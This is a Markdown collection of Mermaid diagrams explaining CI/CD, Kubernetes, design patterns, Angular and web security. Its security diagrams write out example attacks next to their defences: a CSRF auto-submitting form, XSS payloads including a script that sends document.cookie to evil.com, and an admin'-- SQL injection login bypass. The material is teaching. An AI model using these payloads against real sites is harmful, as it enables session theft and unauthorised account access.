# 🎨 Visual Diagrams — Cloud, DevOps, Security & LLD

> Sequence diagrams, class diagrams, state machines, and architecture flows.
> Renders on GitHub, VS Code (Markdown Preview Enhanced), GitLab, Obsidian.

---

## 📋 Table of Contents

### Cloud & DevOps
1. [CI/CD Pipeline Stages](#1-cicd-pipeline-stages)
2. [Kubernetes Architecture](#2-kubernetes-architecture)
3. [Deployment Strategies Compared](#3-deployment-strategies-compared)
4. [Docker Multi-Stage Build](#4-docker-multi-stage-build)
5. [Observability — Three Pillars](#5-observability--three-pillars)
6. [Health Checks — Liveness vs Readiness](#6-health-checks--liveness-vs-readiness)

### Security
7. [JWT Authentication Full Flow](#7-jwt-authentication-full-flow)
8. [OAuth 2.0 + OIDC Flow](#8-oauth-20--oidc-flow)
9. [CSRF Attack & Defense](#9-csrf-attack--defense)
10. [XSS Attack Types](#10-xss-attack-types)
11. [SQL Injection Attack & Defense](#11-sql-injection-attack--defense)
12. [Password Hashing — Why bcrypt](#12-password-hashing--why-bcrypt)

### Low-Level Design (LLD)
13. [Design Patterns — Class Diagrams](#13-design-patterns--class-diagrams)
14. [Singleton Pattern Flow](#14-singleton-pattern-flow)
15. [Observer Pattern Flow](#15-observer-pattern-flow)
16. [Strategy Pattern Flow](#16-strategy-pattern-flow)
17. [Command Pattern — Undo Stack](#17-command-pattern--undo-stack)
18. [Chain of Responsibility Flow](#18-chain-of-responsibility-flow)
19. [Parking Lot — Class Diagram](#19-parking-lot--class-diagram)
20. [BookMyShow — Seat Booking Flow](#20-bookmyshow--seat-booking-flow)

### Frontend
21. [Angular Component Lifecycle](#21-angular-component-lifecycle)
22. [RxJS Operator Decision Tree](#22-rxjs-operator-decision-tree)
23. [NgRx State Management Flow](#23-ngrx-state-management-flow)
24. [Angular Change Detection](#24-angular-change-detection)

---

# ☁️ Cloud & DevOps Diagrams

## 1. CI/CD Pipeline Stages

```mermaid
flowchart TD
    DEV([Developer\nPushes code]) --> PR[Pull Request\nCode Review]
    PR --> CI

    subgraph CI["🔵 CI — Continuous Integration"]
        R[Restore packages\ndotnet restore]
        B[Build\ndotnet build --no-restore]
        UT[Unit Tests\ndotnet test]
        COV[Coverage Check\n> 80% required]
        SA[Static Analysis\nSonarQube / CodeQL]
        SEC[Security Scan\nOWASP dependency-check]
        IMG[Docker Build\n+ Push to Registry]
        R --> B --> UT --> COV --> SA --> SEC --> IMG
    end

    IMG --> CD_STG

    subgraph CD_STG["🟡 CD — Deploy to Staging"]
        MIG[Run DB Migrations\nEF Core / Flyway]
        K8S[kubectl apply\nDeployment.yaml]
        SMOKE[Smoke Tests\nBasic endpoint checks]
        INTG[Integration Tests\nWebApplicationFactory]
        MIG --> K8S --> SMOKE --> INTG
    end

    INTG --> GATE{Manual Approval\n👤 Required}
    GATE -->|Approved| CD_PROD

    subgraph CD_PROD["🟢 CD — Deploy to Production"]
        DEPLOY[Rolling / Blue-Green\nkubectl rollout]
        HEALTH[Health Check\n/health/ready]
        MON[Monitor 5min\nError rate < 1%]
        TAG[Git Tag Release\nv1.5.0]
        DEPLOY --> HEALTH --> MON --> TAG
    end

    MON -->|Error spike| ROLLBACK[⚡ Auto-Rollback\nkubectl rollout undo]

    style CI fill:#1a237e,color:#fff
    style CD_STG fill:#F57F17,color:#000
    style CD_PROD fill:#1b5e20,color:#fff
    style ROLLBACK fill:#c62828,color:#fff
    style GATE fill:#4A148C,color:#fff
```

---

## 2. Kubernetes Architecture

```mermaid
flowchart TD
    subgraph Cluster["☸️ Kubernetes Cluster"]
        subgraph CP["Control Plane"]
            API5[API Server\nkubectl target]
            SCHED[Scheduler\nPlaces pods on nodes]
            ETCD[(etcd\nCluster state)]
            CM[Controller Manager\nEnsures desired state]
        end

        subgraph N1["Worker Node 1"]
            KUB1[Kubelet] & KP1[Kube-Proxy]
            subgraph P1A["Pod — order-api"]
                C_OA[Container\norder-api:1.5\nCPU: 250m Mem: 256Mi]
            end
            subgraph P1B["Pod — order-api"]
                C_OB[Container\norder-api:1.5]
            end
        end

        subgraph N2["Worker Node 2"]
            KUB2[Kubelet] & KP2[Kube-Proxy]
            subgraph P2A["Pod — order-api"]
                C_OC[Container\norder-api:1.5]
            end
        end

        SVC3[Service\norder-api-svc\nClusterIP / LoadBalancer\nRound-robin to pods]
        ING[Ingress\nnginx / traefik\nPath routing + TLS]
        HPA2[HPA\nAuto-scales pods\nCPU > 70% → scale out]
        CM2[ConfigMap\nnon-sensitive config]
        SEC2[Secret\npasswords / keys\nbase64 encoded]
    end

    EXTCLIENT([External Client]) --> ING --> SVC3
    SVC3 --> P1A & P1B & P2A
    API5 --> SCHED --> N1 & N2
    API5 --> ETCD
    HPA2 --> P1A & P1B & P2A

    style CP fill:#1a237e,color:#fff
    style SVC3 fill:#FF6F00,color:#fff
    style HPA2 fill:#2e7d32,color:#fff
    style ING fill:#880E4F,color:#fff
```

---

## 3. Deployment Strategies Compared

```mermaid
flowchart TD
    subgraph RollingDeploy["🔄 Rolling Deployment"]
        R_BEF["Before: [v1][v1][v1][v1]"]
        R_S1["Step 1: [v2][v1][v1][v1]"]
        R_S2["Step 2: [v2][v2][v1][v1]"]
        R_S3["Step 3: [v2][v2][v2][v1]"]
        R_AFT["After:  [v2][v2][v2][v2]"]
        R_BEF --> R_S1 --> R_S2 --> R_S3 --> R_AFT
    end

    subgraph BGDeploy["🔵🟢 Blue-Green Deployment"]
        BG_LB["Load Balancer"]
        BG_BLUE["🔵 Blue — v1.4\n(100% traffic LIVE)"]
        BG_GREEN["🟢 Green — v1.5\n(0% traffic STAGING)"]
        BG_LB --> BG_BLUE
        BG_LB -.->|smoke test| BG_GREEN
        BG_FLIP["⚡ Flip: one kubectl patch\nInstant rollback available"]
        BG_GREEN -->|pass tests| BG_FLIP
    end

    subgraph CanaryDeploy["🐤 Canary Deployment"]
        CAN_LB["Load Balancer"]
        CAN_STABLE["Stable — v1.4\n9 replicas (90% traffic)"]
        CAN_CANARY["Canary — v1.5\n1 replica (10% traffic)"]
        CAN_LB --> CAN_STABLE & CAN_CANARY
        CAN_MON["Monitor canary:\nError rate ✅ Latency ✅\n→ Gradually increase %"]
        CAN_CANARY --> CAN_MON
    end

    style BGDeploy fill:#1a237e,color:#fff
    style RollingDeploy fill:#1b5e20,color:#fff
    style CanaryDeploy fill:#4A148C,color:#fff
```

---

## 4. Docker Multi-Stage Build

```mermaid
flowchart LR
    subgraph Stage1["Stage 1: BUILD (SDK image ~900MB)"]
        SDK["FROM mcr.microsoft.com/dotnet/sdk:8.0"]
        COPY["COPY .csproj → dotnet restore"]
        BUILD["COPY . → dotnet publish -o /publish"]
    end

    subgraph Stage2["Stage 2: RUNTIME (ASP.NET image ~220MB)"]
        RT["FROM mcr.microsoft.com/dotnet/aspnet:8.0"]
        USER["RUN adduser appuser\nUSER appuser (non-root ✅)"]
        CPY["COPY --from=build /publish ."]
        ENT["ENTRYPOINT [dotnet, MyApp.dll]"]
    end

    RESULT["✅ Final image: ~220MB\n(SDK not included)\n✅ Non-root user\n✅ Only runtime files"]

    Stage1 --> Stage2 --> RESULT

    style Stage1 fill:#FF6F00,color:#fff
    style Stage2 fill:#1565C0,color:#fff
    style RESULT fill:#1b5e20,color:#fff
```

---

## 5. Observability — Three Pillars

```mermaid
flowchart LR
    APP2[.NET Application]

    subgraph Logs["📋 Logs — What happened?"]
        SERILOG[Serilog\nStructured JSON logs]
        SEQ2[Seq / ELK Stack\nQuery: WHERE OrderId='abc'"]
    end

    subgraph Metrics2["📊 Metrics — How much / How fast?"]
        PROM3[Prometheus\nScrapes /metrics every 15s]
        GRAF[Grafana\nDashboards + Alerts\nGolden Signals]
    end

    subgraph Traces2["🔍 Traces — Where is it slow?"]
        OTEL2[OpenTelemetry\nActivitySource spans]
        JAEGER2[Jaeger / Azure Monitor\nSpan tree visualisation]
    end

    APP2 --> SERILOG --> SEQ2
    APP2 --> PROM3 --> GRAF
    APP2 --> OTEL2 --> JAEGER2

    GOLDEN["📌 Golden Signals (Google SRE)\n1. Latency — how long do requests take?\n2. Traffic — how many requests/sec?\n3. Errors — what % fail?\n4. Saturation — how full is the system?"]

    style Logs fill:#1a237e,color:#fff
    style Metrics2 fill:#1b5e20,color:#fff
    style Traces2 fill:#880E4F,color:#fff
    style GOLDEN fill:#FF6F00,color:#fff
```

---

## 6. Health Checks — Liveness vs Readiness

```mermaid
flowchart TD
    subgraph Probes["Kubernetes Probes"]
        LIVE["💓 Liveness Probe\nGET /health/live\nChecks: is app deadlocked / crashed?\nFails → K8s RESTARTS the pod\n\nOnly check: self (always returns Healthy)\nDO NOT check DB here (DB down → restart loop!)"]

        READY["✅ Readiness Probe\nGET /health/ready\nChecks: DB ✅ Redis ✅ External APIs ✅\nFails → K8s REMOVES pod from LB\n(pod stays running, just gets no traffic)\n\nUse for: warmup, DB migration, dependency outage"]

        STARTUP["🚀 Startup Probe\nSlow-starting apps (JVM, ML models)\nK8s waits longer before checking Liveness\nPrevents restart loop on slow boot"]
    end

    subgraph Behaviour["K8s Actions"]
        B1["Liveness FAIL × 3\n→ kubectl delete pod\n→ K8s creates new pod"]
        B2["Readiness FAIL\n→ Remove from Service endpoints\n→ No traffic sent\n→ Pod still running (waiting to recover)"]
    end

    LIVE --> B1
    READY --> B2

    style LIVE fill:#c62828,color:#fff
    style READY fill:#2e7d32,color:#fff
    style STARTUP fill:#1565C0,color:#fff
```

---

# 🔐 Security Diagrams

## 7. JWT Authentication Full Flow

```mermaid
sequenceDiagram
    participant C7 as Client (SPA/Mobile)
    participant AUTH2 as Auth Service
    participant DB8 as User DB
    participant API6 as Protected API
    participant JWT2 as JWT Handler

    note over C7,API6: LOGIN
    C7->>AUTH2: POST /auth/login\n{ username, password }
    AUTH2->>DB8: SELECT WHERE username=?\nVERIFY bcrypt hash
    DB8-->>AUTH2: User found ✅
    AUTH2->>AUTH2: Build claims:\nsub=userId, email, roles, exp=+15min
    AUTH2->>AUTH2: Sign with HMAC-SHA256 / RS256 private key
    AUTH2-->>C7: { accessToken: "eyJ...", refreshToken: "opaque..." }

    note over C7,API6: AUTHENTICATED REQUEST
    C7->>API6: GET /api/orders\nAuthorization: Bearer eyJ...
    API6->>JWT2: UseAuthentication() middleware
    JWT2->>JWT2: Decode header.payload.signature
    JWT2->>JWT2: ✅ Verify signature\n✅ Check exp not expired\n✅ Check iss matches\n✅ Check aud matches
    JWT2-->>API6: Set HttpContext.User (ClaimsPrincipal)
    API6->>API6: UseAuthorization()\n[Authorize(Roles="Admin")] check
    API6-->>C7: 200 [ orders data ]

    note over C7,API6: TOKEN REFRESH
    C7->>AUTH2: POST /auth/refresh\n{ refreshToken: "opaque..." }
    AUTH2->>DB8: Verify hash, not revoked, not expired
    DB8-->>AUTH2: Valid ✅
    AUTH2->>AUTH2: Rotate: revoke old refresh token
    AUTH2-->>C7: { accessToken: new_eyJ..., refreshToken: new_opaque }
```

---

## 8. OAuth 2.0 + OIDC Flow

```mermaid
sequenceDiagram
    participant U as User
    participant APP as Your App (Client)
    participant IDP as Identity Provider\n(Google / Microsoft / Auth0)
    participant API7 as Your Protected API

    note over U,API7: Authorization Code + PKCE Flow

    U->>APP: Click "Login with Google"
    APP->>APP: Generate code_verifier + code_challenge\n(PKCE — prevents auth code interception)
    APP-->>U: Redirect to IDP\n?client_id=...&scope=openid email\n&code_challenge=...&redirect_uri=...

    U->>IDP: Login + Consent screen
    note over IDP: "Allow App to read your email?"
    IDP-->>U: Redirect to App\n?code=AUTH_CODE

    APP->>IDP: POST /token\n{ code, code_verifier, client_id, client_secret }
    IDP->>IDP: Verify code + PKCE challenge
    IDP-->>APP: { access_token, id_token(JWT), refresh_token }

    note over APP: ID Token contains: sub, email, name, picture\n= Who the user IS (OIDC)

    APP->>API7: GET /api/profile\nAuthorization: Bearer access_token
    API7->>IDP: GET /.well-known/jwks.json (public keys)
    IDP-->>API7: Public key set
    API7->>API7: Verify access_token signature
    API7-->>APP: 200 Profile data
```

---

## 9. CSRF Attack & Defense

```mermaid
sequenceDiagram
    participant Alice as Alice (Victim)
    participant Bank as bank.com (Vulnerable)
    participant Evil as evil.com (Attacker)

    note over Alice,Bank: Alice is logged in — has session cookie

    Alice->>Evil: Visits evil.com (ad click, link)

    note over Evil: evil.com has hidden form:
    note over Evil: <form action="https://bank.com/transfer" method="POST">
    note over Evil: <input name="amount" value="10000">
    note over Evil: </form> auto-submits via JS

    Evil->>Bank: POST /transfer { amount: 10000 }\n🍪 Cookie: session=alice_abc (auto-sent!)
    note over Bank: ❌ No CSRF protection\nLegitimate-looking request\nTransfer executes!
    Bank-->>Alice: Money gone 💸

    note over Alice,Bank: ✅ DEFENSE: SameSite Cookie
    note over Bank: Set-Cookie: session=abc;\nSameSite=Strict (or Lax)
    note over Bank: SameSite=Strict → browser does NOT send\ncookie on cross-site form POST
    note over Evil: ❌ POST from evil.com → no cookie sent → 401
```

```mermaid
flowchart LR
    subgraph Defenses["✅ CSRF Defenses"]
        SS["SameSite=Strict Cookie\nBest modern defense\nCookie not sent cross-site"]
        ATOKEN["Anti-Forgery Token\n__RequestVerificationToken\nHidden field in form\nServer validates on POST"]
        JWT3["JWT Bearer Auth\nNo auto-send → CSRF immune\nClient must set Authorization header\nEvil site cannot set custom headers"]
    end

    subgraph Vulnerable["❌ Still Vulnerable"]
        PLAIN["Plain session cookies\nWithout SameSite\nBrowser auto-sends to any domain"]
    end

    style SS fill:#1b5e20,color:#fff
    style ATOKEN fill:#1565C0,color:#fff
    style JWT3 fill:#2e7d32,color:#fff
    style PLAIN fill:#c62828,color:#fff
```

---

## 10. XSS Attack Types

```mermaid
flowchart TD
    subgraph Stored["💾 Stored XSS — Most Dangerous"]
        A1["Attacker posts comment:\n<script>fetch('https://evil.com?c='+document.cookie)</script>"]
        DB9[("Comment saved to DB")]
        V1["Alice views page\n→ script executes\n→ cookie stolen to evil.com"]
        A1 --> DB9 --> V1
    end

    subgraph Reflected["🔗 Reflected XSS"]
        A2["Attacker crafts URL:\nhttps://app.com/search\n?q=<script>alert(1)</script>"]
        SERV["Server reflects in HTML:\n<p>Results for: <script>alert(1)</script>"]
        V2["User clicks link\n→ script executes\n→ one-time attack"]
        A2 --> SERV --> V2
    end

    subgraph DOM["🌐 DOM-Based XSS"]
        A3["Attacker crafts URL with hash:\nhttps://app.com/#<img onerror='evil()'>"]
        JS["Client JS:\ndocument.getElementById('out').innerHTML\n= location.hash  ← dangerous!"]
        V3["No server involved\nPure client-side execution"]
        A3 --> JS --> V3
    end

    subgraph Defense2["✅ Defenses"]
        OE["Output Encoding\n@Model.UserInput (Razor auto-encodes)\nHtmlEncoder.Default.Encode(input)"]
        CSP2["Content Security Policy\nContent-Security-Policy: default-src 'self'\nBlocks inline scripts even if injected"]
        HTTP2["HttpOnly Cookies\nJS cannot access document.cookie\nXSS cannot steal session"]
        TC["textContent not innerHTML\nel.textContent = userInput ✅\nel.innerHTML = userInput ❌"]
    end

    style Stored fill:#c62828,color:#fff
    style Reflected fill:#FF6F00,color:#fff
    style DOM fill:#880E4F,color:#fff
    style Defense2 fill:#1b5e20,color:#fff
```

---

## 11. SQL Injection Attack & Defense

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant APP3 as Vulnerable App
    participant DB10 as Database

    ATK->>APP3: GET /login?user=admin'--&pass=anything

    note over APP3: ❌ String concatenation:
    note over APP3: "SELECT * FROM Users WHERE\nUsername='" + input + "' AND Password='"+ pass +"'"

    note over APP3: Becomes:
    note over APP3: SELECT * FROM Users WHERE\nUsername='admin'--' AND Password='anything'
    note over APP3: -- comments out password check!

    APP3->>DB10: Execute malicious SQL
    DB10-->>APP3: admin user row returned
    APP3-->>ATK: ✅ Logged in as admin (no password needed!)

    note over ATK,DB10: ✅ DEFENSE: Parameterised Query
    APP3->>DB10: SELECT * FROM Users\nWHERE Username = @p0\nAND Password = @p1\n[p0="admin'--", p1="anything"]
    note over DB10: @p0 treated as literal string\nnot SQL syntax\n'admin'--' searched literally → no match
    DB10-->>APP3: No rows
    APP3-->>ATK: ❌ Login failed
```

---

## 12. Password Hashing — Why bcrypt

```mermaid
flowchart TD
    subgraph BadHash["❌ MD5 / SHA-256 (Never use for passwords)"]
        RAW["Password: 'password123'"]
        MD5["MD5('password123')\n→ 482c811da5d5b4bc6d497ffa98491e38\nSame input = same hash always"]
        RAIN["Rainbow table lookup:\n482c811d... → 'password123' ✅\nCracked in milliseconds"]
        RAW --> MD5 --> RAIN
    end

    subgraph GoodHash["✅ bcrypt (Use this)"]
        RAW2["Password: 'password123'"]
        SALT["Generate random salt:\nSalt1 = 'xK9p2mL7'"]
        BCRYPT["bcrypt('password123', Salt1, workFactor=12)\n→ $2a$12$xK9p2mL7...uniquehash1\n\nbcrypt('password123', Salt2)\n→ $2a$12$differentSalt...differenthash\n\nSame input = DIFFERENT hash each time!"]
        SLOW["workFactor=12 → 2^12 = 4096 rounds\n~200ms per hash\nBrute force: 200ms × billions = impractical"]
        RAW2 --> SALT --> BCRYPT --> SLOW
    end

    style BadHash fill:#c62828,color:#fff
    style GoodHash fill:#1b5e20,color:#fff
```

---

# 🏗️ Low-Level Design (LLD) Diagrams

## 13. Design Patterns — Class Diagrams

```mermaid
classDiagram
    class IOrderService {
        <<interface>>
        +GetOrderAsync(Guid id) Task~Order~
    }
    class OrderService {
        -IOrderRepository repo
        +GetOrderAsync(Guid id) Task~Order~
    }
    class CachingOrderService {
        -IOrderService inner
        -IMemoryCache cache
        +GetOrderAsync(Guid id) Task~Order~
    }
    class LoggingOrderService {
        -IOrderService inner
        -ILogger log
        +GetOrderAsync(Guid id) Task~Order~
    }

    IOrderService <|.. OrderService : implements
    IOrderService <|.. CachingOrderService : implements
    IOrderService <|.. LoggingOrderService : implements
    CachingOrderService --> IOrderService : wraps (Decorator)
    LoggingOrderService --> IOrderService : wraps (Decorator)
```

```mermaid
classDiagram
    class IDiscountStrategy {
        <<interface>>
        +Apply(decimal price) decimal
    }
    class NoDiscount
    class RegularDiscount
    class PremiumDiscount
    class VipDiscount
    class OrderPricer {
        -IDiscountStrategy strategy
        +SetStrategy(IDiscountStrategy)
        +Calculate(decimal price) decimal
    }

    IDiscountStrategy <|.. NoDiscount
    IDiscountStrategy <|.. RegularDiscount
    IDiscountStrategy <|.. PremiumDiscount
    IDiscountStrategy <|.. VipDiscount
    OrderPricer --> IDiscountStrategy : uses (Strategy)
```

---

## 14. Singleton Pattern Flow

```mermaid
flowchart TD
    subgraph SingletonFlow["Singleton — Lazy&lt;T&gt; Thread-Safe"]
        FIRST["First call: Instance"]
        CHECK1{"_lazy.IsValueCreated?"}
        CREATE["Create new instance\n(only once ever)"]
        RETURN1["Return instance"]

        SECOND["Subsequent calls: Instance"]
        CHECK2{"Already created?"}
        RETURN2["Return same instance\n(no creation)"]

        FIRST --> CHECK1
        CHECK1 -->|No| CREATE --> RETURN1
        CHECK1 -->|Yes| RETURN1
        SECOND --> CHECK2
        CHECK2 -->|Yes — always| RETURN2
    end

    DI["✅ Preferred: DI Container Singleton\nbuilder.Services.AddSingleton&lt;T&gt;()\nContainer manages lifecycle\nTestable — can mock in tests"]

    style CREATE fill:#1565C0,color:#fff
    style DI fill:#1b5e20,color:#fff
```

---

## 15. Observer Pattern Flow

```mermaid
sequenceDiagram
    participant SUB as Subject\n(OrderService)
    participant OBS1 as EmailNotifier\n(Observer 1)
    participant OBS2 as AuditLogger\n(Observer 2)
    participant OBS3 as InventoryUpdater\n(Observer 3)

    note over SUB: Register observers (subscription)
    OBS1->>SUB: Register()
    OBS2->>SUB: Register()
    OBS3->>SUB: Register()

    note over SUB: Order status changes → notify all
    SUB->>SUB: UpdateStatus(order, "Shipped")
    SUB->>OBS1: OnOrderStatusChanged(event)
    OBS1->>OBS1: Send email "Your order shipped!"
    SUB->>OBS2: OnOrderStatusChanged(event)
    OBS2->>OBS2: Log to audit trail
    SUB->>OBS3: OnOrderStatusChanged(event)
    OBS3->>OBS3: Update inventory counts

    note over SUB,OBS3: Each observer acts independently\nSubject doesn't know their logic
```

---

## 16. Strategy Pattern Flow

```mermaid
flowchart TD
    CLIENT2([Client: checkout]) -->|customerId| LOOKUP[Look up customer type]
    LOOKUP -->|Regular| RS[RegularDiscount\n10% off]
    LOOKUP -->|Premium| PS4[PremiumDiscount\n20% off]
    LOOKUP -->|VIP| VS[VipDiscount\n30% off]

    RS & PS4 & VS --> CTX[OrderPricer Context\n_strategy.Apply price]
    CTX --> RESULT2[Final price]

    subgraph Swap["Runtime Strategy Swap"]
        direction LR
        BEFORE["pricer.SetStrategy\nnew RegularDiscount"]
        AFTER["pricer.SetStrategy\nnew VipDiscount"]
        BEFORE -->|customer upgrades| AFTER
    end

    style RS fill:#2e7d32,color:#fff
    style PS4 fill:#1565C0,color:#fff
    style VS fill:#880E4F,color:#fff
```

---

## 17. Command Pattern — Undo Stack

```mermaid
flowchart TD
    CLIENT3([Client]) -->|Execute| INVOKER[CommandInvoker\n_history: Stack&lt;ICommand&gt;]
    INVOKER -->|cmd.Execute| CMD3[ShipOrderCommand\n- Execute: status = Shipped\n- Undo: status = previousStatus]
    CMD3 --> ORDER[Order Entity\nStatus updated]
    INVOKER -->|_history.Push cmd| STACK[History Stack\n[ShipOrderCmd, ...]

    CLIENT3 -->|Undo| INVOKER2[CommandInvoker]
    INVOKER2 -->|_history.Pop| CMD4[Get last command]
    CMD4 -->|cmd.Undo| ORDER2[Order Entity\nStatus restored]

    style STACK fill:#1565C0,color:#fff
    style INVOKER fill:#FF6F00,color:#fff
```

---

## 18. Chain of Responsibility Flow

```mermaid
flowchart TD
    REQ3[Approval Request\nAmount: $75,000]

    TL[Team Lead Handler\nLimit: $10,000]
    MGR[Manager Handler\nLimit: $50,000]
    DIR[Director Handler\nLimit: $100,000]
    CEO[CEO Handler\nLimit: $1,000,000]
    ESC[Escalate to Board\nAmount exceeds all authority]

    REQ3 --> TL
    TL -->|75k > 10k → pass| MGR
    MGR -->|75k > 50k → pass| DIR
    DIR -->|75k ≤ 100k| APPROVED["✅ Approved by Director"]

    BIGAMT[Amount: $2,000,000]
    BIGAMT --> TL2[Team Lead] -->|pass| MGR2[Manager] -->|pass| DIR2[Director] -->|pass| CEO2[CEO] -->|pass| ESC

    style APPROVED fill:#2e7d32,color:#fff
    style ESC fill:#c62828,color:#fff
```

---

## 19. Parking Lot — Class Diagram

```mermaid
classDiagram
    class ParkingLot {
        -string name
        -List~ParkingFloor~ floors
        +getAvailableSpots(VehicleType) List~ParkingSpot~
        +park(Vehicle) Ticket
        +unpark(Ticket) Payment
    }
    class ParkingFloor {
        -int floorNumber
        -List~ParkingSpot~ spots
        +getAvailableSpots(VehicleType) List~ParkingSpot~
    }
    class ParkingSpot {
        -string spotId
        -SpotType type
        -SpotStatus status
        -Vehicle vehicle
        +assign(Vehicle)
        +free()
        +isAvailable() bool
    }
    class Vehicle {
        <<abstract>>
        -string licensePlate
        -VehicleType type
    }
    class Car
    class Truck
    class Motorcycle
    class Ticket {
        -string ticketId
        -ParkingSpot spot
        -DateTime entryTime
        -DateTime? exitTime
    }
    class IPricingStrategy {
        <<interface>>
        +calculateFee(Ticket) decimal
    }
    class HourlyPricing
    class DailyPricing

    ParkingLot "1" --> "*" ParkingFloor
    ParkingFloor "1" --> "*" ParkingSpot
    ParkingSpot "0..1" --> "0..1" Vehicle
    ParkingLot --> Ticket : creates
    Ticket --> ParkingSpot : references
    ParkingLot --> IPricingStrategy : uses
    IPricingStrategy <|.. HourlyPricing
    IPricingStrategy <|.. DailyPricing
    Vehicle <|-- Car
    Vehicle <|-- Truck
    Vehicle <|-- Motorcycle
```

---

## 20. BookMyShow — Seat Booking Flow

```mermaid
stateDiagram-v2
    [*] --> Available

    Available --> Held : holdSeat(userId, 10min)\nDistributed lock acquired
    Held --> Available : hold expired (10min)\nBackground job releases
    Held --> Available : user cancelled
    Held --> Booked : confirmBooking()\nPayment processed ✅

    Booked --> Available : refund + cancel\n(before showtime only)

    note right of Held
        Redis lock prevents
        concurrent pickup
        by two users
    end note
```

```mermaid
sequenceDiagram
    participant U1 as User Alice
    participant U2 as User Bob
    participant API8 as Booking API
    participant LOCK3 as Distributed Lock (Redis)
    participant DB11 as ShowSeats DB

    par Alice and Bob try same seat simultaneously
        U1->>API8: POST /bookings/hold { showId, seatIds:[S1,S2] }
        U2->>API8: POST /bookings/hold { showId, seatIds:[S1,S2] }
    end

    API8->>LOCK3: ACQUIRE lock on show-123 (Alice first)
    LOCK3-->>API8: Acquired ✅
    API8->>DB11: SELECT seats WHERE id IN (S1,S2) FOR UPDATE
    DB11-->>API8: S1=Available, S2=Available
    API8->>DB11: UPDATE seats SET status=Held, heldBy=Alice
    API8->>LOCK3: RELEASE lock
    API8-->>U1: { holdId, expiresIn: 600s, total: ₹500 }

    API8->>LOCK3: ACQUIRE lock on show-123 (Bob)
    LOCK3-->>API8: Acquired ✅
    API8->>DB11: SELECT seats WHERE id IN (S1,S2)
    DB11-->>API8: S1=Held, S2=Held ❌
    API8->>LOCK3: RELEASE lock
    API8-->>U2: 409 Conflict — Seats no longer available
```

---

# 🌐 Frontend Diagrams

## 21. Angular Component Lifecycle

```mermaid
flowchart TD
    CONST["constructor()\nDI injection only\n❌ No @Input values yet"]
    NGOC["ngOnChanges(changes)\n✅ @Input values first available\nRuns BEFORE ngOnInit\nRuns on every @Input change"]
    NGOI["ngOnInit()\n✅ One-time setup\nHTTP calls here\nComponent fully initialised"]
    NGDC["ngDoCheck()\nCustom change detection\n⚠️ Runs very frequently\nAvoid expensive operations"]
    NGACI["ngAfterContentInit()\nAfter ng-content projected\nOnce after first DoCheck"]
    NGACW["ngAfterContentChecked()\nAfter every DoCheck with content\n⚠️ Performance sensitive"]
    NGAVI["ngAfterViewInit()\n✅ DOM available\nViewChild refs accessible\nNot available before this"]
    NGAVW["ngAfterViewChecked()\nAfter every view change\n⚠️ Performance sensitive"]
    NGOD["ngOnDestroy()\n✅ ALWAYS implement\nUnsubscribe Observables\nClear intervals/timers\nRelease resources"]

    CONST --> NGOC --> NGOI --> NGDC --> NGACI --> NGACW --> NGAVI --> NGAVW
    NGAVW -->|"on @Input change"| NGOC
    NGAVW -->|destroy| NGOD

    style NGOI fill:#1b5e20,color:#fff
    style NGOD fill:#c62828,color:#fff
    style NGAVI fill:#1565C0,color:#fff
    style NGOC fill:#FF6F00,color:#fff
```

---

## 22. RxJS Operator Decision Tree

```mermaid
flowchart TD
    START3([I need to...])

    Q1c{Transform each\nvalue?}
    Q2c{Make inner\nObservable?}
    Q3c{Cancel previous\non new value?}
    Q4c{Wait for previous\nto complete?}
    Q5c{Run all in parallel?}
    Q6c{Ignore while busy?}
    Q7c{Filter values?}
    Q8c{Combine latest\nfrom multiple?}

    MAP2["map(fn)\nTransform each value\n[1,2,3] → [2,4,6]"]
    SWITCHMAP["switchMap(fn) ✅\nTypeahead search\nCancel prev, use latest"]
    CONCATMAP["concatMap(fn)\nQueued sequential\nFile uploads in order"]
    MERGEMAP["mergeMap(fn)\nAll parallel\nBatch notifications"]
    EXHAUSTMAP["exhaustMap(fn)\nIgnore while busy\nForm submit button"]
    FILTER2["filter(predicate)\nOnly pass matching\nfilter(x => x > 0)"]
    COMBINELATEST2["combineLatest([a$,b$])\nEmit when any changes\nForm validity + data"]

    START3 --> Q1c
    Q1c -->|Simple transform| MAP2
    Q1c -->|Makes Observable| Q2c
    Q2c -->|Yes| Q3c
    Q3c -->|Yes| SWITCHMAP
    Q3c -->|No| Q4c
    Q4c -->|Yes| CONCATMAP
    Q4c -->|No| Q5c
    Q5c -->|Yes| MERGEMAP
    Q5c -->|No| Q6c
    Q6c -->|Yes| EXHAUSTMAP
    Q1c -->|Filter| Q7c
    Q7c -->|Yes| FILTER2
    Q7c -->|No| Q8c
    Q8c -->|Yes| COMBINELATEST2

    style SWITCHMAP fill:#1565C0,color:#fff
    style CONCATMAP fill:#2e7d32,color:#fff
    style MERGEMAP fill:#880E4F,color:#fff
    style EXHAUSTMAP fill:#FF6F00,color:#fff
```

---

## 23. NgRx State Management Flow

```mermaid
flowchart LR
    subgraph NgRxFlow["NgRx Unidirectional Data Flow"]
        COMP2[Component\nUI triggers action]
        ACT[Action\n{ type: '[Orders] Load' }]
        EFF[Effect\nSide effects: HTTP calls\nDispatch result action]
        RED[Reducer\nPure function\nold state + action → new state]
        STORE2[("Store\n{ orders: [], loading: false }")]
        SEL[Selector\nMemoized derivation\nselect('orders')"]
        COMP2

        COMP2 -->|dispatch| ACT
        ACT --> EFF
        EFF -->|HTTP success| ACT2[Success Action\n{ type: '[Orders] Loaded'\npayload: orders[] }]
        ACT2 --> RED
        RED --> STORE2
        STORE2 --> SEL
        SEL -->|Observable| COMP2
    end

    style STORE2 fill:#FF6F00,color:#fff
    style RED fill:#1565C0,color:#fff
    style EFF fill:#880E4F,color:#fff
    style SEL fill:#1b5e20,color:#fff
```

---

## 24. Angular Change Detection

```mermaid
flowchart TD
    subgraph Default["ChangeDetectionStrategy.Default"]
        EVT["Any event anywhere in app\nClick, HTTP, timer, Promise..."]
        CD["Angular checks EVERY component\ntop-down in component tree\n⚠️ Even unrelated components"]
        UP["Updates DOM if changed"]
        EVT --> CD --> UP
    end

    subgraph OnPush["ChangeDetectionStrategy.OnPush ✅ Recommended"]
        EVT2["Event in THIS component\nOR @Input reference changes\nOR async pipe emits\nOR markForCheck() called"]
        SKIP["Skip subtree if no change\n✅ Much faster for large trees"]
        CD2["Check only this component\nand its children if needed"]
        EVT2 --> CD2
        CD2 -->|No trigger| SKIP
        CD2 -->|Triggered| UP2["Update DOM"]
    end

    RULE["📌 Rule:\nPresentational/dumb components → OnPush\nMust use immutable inputs or Observables\nnew array reference needed (not .push())"]

    style Default fill:#c62828,color:#fff
